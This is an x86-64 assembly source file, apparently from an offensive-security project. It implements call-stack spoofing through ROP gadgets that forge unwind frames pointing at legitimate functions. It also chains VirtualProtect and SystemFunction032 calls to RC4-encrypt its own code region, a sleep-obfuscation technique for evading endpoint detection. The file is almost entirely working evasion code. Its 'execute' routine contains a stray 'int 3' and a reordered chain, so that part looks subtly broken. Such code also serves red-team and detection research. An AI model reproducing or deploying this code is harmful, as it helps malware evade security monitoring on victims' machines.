;   ------------------------------------------------------------------------------------
;
;   Author       : klezVirus 2022
;   Twitter      : https://twitter.com/klezVirus
;   Original Idea: Namazso 
;   Twitter      : https://twitter.com/namazso
;   ------------------------------------------------------------------------------------
;   ------------------------------------------------------------------------------------

spoof_call proto
restore proto

.data

;   ------------------------------------------------------------------------------------
; 	Spoofing Configuration Structure
;   Utility structure to pass all the relevant details from C to ASM regarding the 
;   stack frames to spoof
;   ------------------------------------------------------------------------------------
SPOOFER STRUCT
;   RCX +00h
    CodeBaseAddress                 DQ 1
    SystemFunction032Address        DQ 1
    VirtualProtectAddress           DQ 1
    OldProtection                   DQ 1

    PopRdxGadget                    DQ 1
    PopRegsGadget                   DQ 1
    AddRsp28Gadget                  DQ 1
    MovRspR11Gadget                 DQ 1

;   RCX +40h
    FirstFrameFunctionPointer       DQ 1
    SecondFrameFunctionPointer      DQ 1
    JmpRbxGadget                    DQ 1
    AddRspXGadget                   DQ 1

;   RCX +60h
	CodeBaseSize					DQ 1
    FirstFrameSize                  DQ 1
    FirstFrameRandomOffset          DQ 1
    SecondFrameSize                 DQ 1
    SecondFrameRandomOffset         DQ 1
    JmpRbxGadgetFrameSize           DQ 1
    AddRspXGadgetFrameSize          DQ 1

    KeyStructPointer                DQ 1
    DataStructPointer               DQ 1

;   RCX +A8h
    StackOffsetWhereRbpIsPushed     DQ 1
    JmpRbxGadgetRef                 DQ 1
    SpoofFunctionPointer            DQ 1
    ReturnAddress                   DQ 1

;   RCX +C8h
    Nargs                           DQ 1

;   RCX +D0h
    Arg01                           DQ 1
    Arg02                           DQ 1
;   RCX +F0h
    Arg03                           DQ 1
    Arg04                           DQ 1
;   RCX +100h
    Args                            DQ 20

SPOOFER ENDS

.code

get_current_rsp proc
	mov     rax, rsp
    add     rax, 8
    ret
get_current_rsp endp

spoof_call proc
;   ------------------------------------------------------------------------------------
;   Saving non-vol registers
;   ------------------------------------------------------------------------------------
	mov     [rsp+08h], rbp
	mov     [rsp+10h], rbx
	mov     r11, rcx
;   ------------------------------------------------------------------------------------
;   Creating a stack reference to the JMP RBX gadget
;   ------------------------------------------------------------------------------------
	mov		rbx, [rcx].SPOOFER.JmpRbxGadget
	mov     [rsp+18h], rbx
	mov		rbx, rsp
	add		rbx, 18h
	mov		[rcx].SPOOFER.JmpRbxGadgetRef, rbx
;   ------------------------------------------------------------------------------------
;   Prolog
;   RBP -> Keeps track of original Stack
; 	RSP -> Desync Stack for Unwinding Info
;   ------------------------------------------------------------------------------------
;   Note: Everything between RSP and RBP is our new stack frame for unwinding 
;   ------------------------------------------------------------------------------------
	mov     rbp, rsp

;   ------------------------------------------------------------------------------------
;   Creating Restore Rop Chain
;   ------------------------------------------------------------------------------------
	
	push    rbp
	push    r12
	push    r13
	push    r14
	push    r15
	push    [r11].SPOOFER.MovRspR11Gadget
    
	push    rbp
	push    r10
	push    r9
	push    r8
	push    rcx	

	push    [r11].SPOOFER.PopRegsGadget

	push    rdx
	push    [r11].SPOOFER.PopRdxGadget

	sub     rsp, 028h
	push    [r11].SPOOFER.AddRsp28Gadget

	sub     rsp, 028h
	push    [r11].SPOOFER.AddRsp28Gadget

	; Virtual Protect
	push    [r11].SPOOFER.VirtualProtectAddress

	push    1 ; r11
	push    1 ; r10
	push    [r11].SPOOFER.OldProtection ; r9
	push    020h ; r8
	push    [r11].SPOOFER.CodeBaseAddress ; rcx	

	push    [r11].SPOOFER.PopRegsGadget

	push    [r11].SPOOFER.CodeBaseSize ; rdx
	push    [r11].SPOOFER.PopRdxGadget

	sub     rsp, 028h
	push    [r11].SPOOFER.AddRsp28Gadget

	; SystemFunction032
	push    [r11].SPOOFER.SystemFunction032Address

	push    1 ; r11
	push    1 ; r10
	push    1 ; r9
	push    1 ; r8
	push    [r11].SPOOFER.DataStructPointer	

	push    [r11].SPOOFER.PopRegsGadget

	push    [r11].SPOOFER.KeyStructPointer	
	push    [r11].SPOOFER.PopRdxGadget
	
	sub     rsp, 028h
	push    [r11].SPOOFER.AddRsp28Gadget


	; Virtual Protect
	push    [r11].SPOOFER.VirtualProtectAddress

	push    1 ; r11
	push    1 ; r10
	push    [r11].SPOOFER.OldProtection ; r9
	push    040h ; r8
	push    [r11].SPOOFER.CodeBaseAddress ; rcx	

	push    [r11].SPOOFER.PopRegsGadget

	push    [r11].SPOOFER.CodeBaseSize ; rdx
	push    [r11].SPOOFER.PopRdxGadget

;   Now RBX contains the stack pointer to Restore ROP CHAIN on the stack  
;   -> Will be called by the push RBX; ret gadget
	mov     rbx, rsp

;   ------------------------------------------------------------------------------------
;   Starting Frames Tampering
;   ------------------------------------------------------------------------------------

;   First Frame (SET_FPREG frame)
;   ------------------------------------------------------------------------------------
	push    [rcx].SPOOFER.FirstFrameFunctionPointer
	mov     rax, [rcx].SPOOFER.FirstFrameRandomOffset
	add     qword ptr [rsp], rax                                      
	
	mov     rax, [rcx].SPOOFER.ReturnAddress
	sub     rax, [rcx].SPOOFER.FirstFrameSize
	
	sub     rsp, [rcx].SPOOFER.SecondFrameSize
	mov     r10, [rcx].SPOOFER.StackOffsetWhereRbpIsPushed
	mov     [rsp+r10], rax
;   ------------------------------------------------------------------------------------
;   Second Frame (PUSH_NONVOL RBP)
;   ------------------------------------------------------------------------------------
	push    [rcx].SPOOFER.SecondFrameFunctionPointer
    mov     rax, [rcx].SPOOFER.SecondFrameRandomOffset
    add     qword ptr [rsp], rax
;   ------------------------------------------------------------------------------------
;   ROP Frames
;   ------------------------------------------------------------------------------------
;   1. JMP [RBX] Gadget (To restore original Control Flow Stack)
;   ------------------------------------------------------------------------------------
	mov     rax, [rcx].SPOOFER.AddRspXGadgetFrameSize
	sub     rsp, [rcx].SPOOFER.JmpRbxGadgetFrameSize
	push    [rcx].SPOOFER.JmpRbxGadgetRef
	sub     rsp, rax
	mov     r10, [rcx].SPOOFER.JmpRbxGadget
;   Placing return address -> JMP [RBX]
;   The return offset (as the gadget size) is a function of the number of arguments
;   This is to ensure we have enough space in the frame to store all the args we need
	mov     [rsp+rax], r10
;   ------------------------------------------------------------------------------------
;   2. Stack PIVOT (To conceal our RIP and return to the JOP gadget)
;   ------------------------------------------------------------------------------------
	push    [rcx].SPOOFER.AddRspXGadget
	mov     rax, [rcx].SPOOFER.AddRspXGadgetFrameSize
	mov		[rbp+28h], rax
;   ------------------------------------------------------------------------------------
;   Set the pointer to the function to call in RAX
;   ------------------------------------------------------------------------------------
	mov     rax, [rcx].SPOOFER.SpoofFunctionPointer
	jmp     parameter_handler
spoof_call endp
	
restore proc
	mov     rsp, rbp
	mov     rbp, [rsp+08h]
	mov     rbx, [rsp+10h]
	ret
restore endp

parameter_handler proc
	mov		r9, rax
	mov		r8, [rcx].SPOOFER.Nargs	
_internal_handler:
	cmp 	r8, 4
	jle     _handle_four_or_less
	mov		rax, 8
	mul		r8
;	RCX is the SPOOFER config, RCX+0A8h is the first parameter
	mov		r15, qword ptr [rcx+0D0h+rax-8]
	mov     [rsp+rax], r15
	dec     r8
	jmp     _internal_handler
_handle_four_or_less:
    xchg	r9, rax
    mov     r9, [rcx].SPOOFER.Arg04
    mov     r8, [rcx].SPOOFER.Arg03
    mov     rdx, [rcx].SPOOFER.Arg02
    mov     rcx, [rcx].SPOOFER.Arg01
	jmp     execute
parameter_handler endp

execute proc
	
	; Spoofed function
	push    rax ; <-- spoofed function

	push    r11
	push    r10
	push    r9
	push    r8
	push    rcx	

	push    [r11].SPOOFER.PopRegsGadget

	push    rdx
	push    [r11].SPOOFER.PopRdxGadget

	sub     rsp, 028h
	sub     rsp, 028h
	push    [r11].SPOOFER.AddRsp28Gadget
	push    [r11].SPOOFER.AddRsp28Gadget

	sub     rsp, 028h
	push    [r11].SPOOFER.AddRsp28Gadget

	; Virtual Protect
	push    [r11].SPOOFER.VirtualProtectAddress

	push    1 ; r11
	push    1 ; r10
	push    [r11].SPOOFER.OldProtection ; r9
	push    020h ; r8
	push    [r11].SPOOFER.CodeBaseAddress ; rcx	

	push    [r11].SPOOFER.PopRegsGadget

	push    [r11].SPOOFER.CodeBaseSize ; rdx
	push    [r11].SPOOFER.PopRdxGadget

	sub     rsp, 028h
	push    [r11].SPOOFER.AddRsp28Gadget

	; SystemFunction032
	push    [r11].SPOOFER.SystemFunction032Address

	push    1 ; r11
	push    1 ; r10
	push    1 ; r9
	push    1 ; r8
	push    [r11].SPOOFER.DataStructPointer	

	push    [r11].SPOOFER.PopRegsGadget

	push    [r11].SPOOFER.KeyStructPointer	
	push    [r11].SPOOFER.PopRdxGadget
	
	sub     rsp, 028h
	push    [r11].SPOOFER.AddRsp28Gadget


	; Virtual Protect
	push    [r11].SPOOFER.VirtualProtectAddress

	int 3
	push    [r11].SPOOFER.CodeBaseSize ; rdx
	push    [r11].SPOOFER.PopRdxGadget

	push    1 ; r11
	push    1 ; r10
	push    [r11].SPOOFER.OldProtection ; r9
	push    040h ; r8
	push    [r11].SPOOFER.CodeBaseAddress ; rcx	

	push    [r11].SPOOFER.PopRegsGadget


	ret
	

execute endp


end